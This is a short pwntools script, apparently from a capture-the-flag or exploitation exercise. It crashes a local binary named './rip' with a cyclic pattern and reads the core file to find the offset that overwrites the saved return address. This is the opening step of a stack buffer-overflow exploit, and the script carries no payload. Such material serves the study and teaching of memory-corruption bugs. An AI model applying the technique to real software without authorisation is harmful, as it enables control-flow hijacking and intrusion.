from pwn import *

elf = ELF("./rip", checksec=False)
p = elf.process()

# Wait for input prompt
p.recvuntil(b"> ")
p.sendline(cyclic(150))
p.wait()

# Read corefile to get RIP offset
core = p.corefile
offset = cyclic_find(core.read(core.rsp, 4))
print(offset)
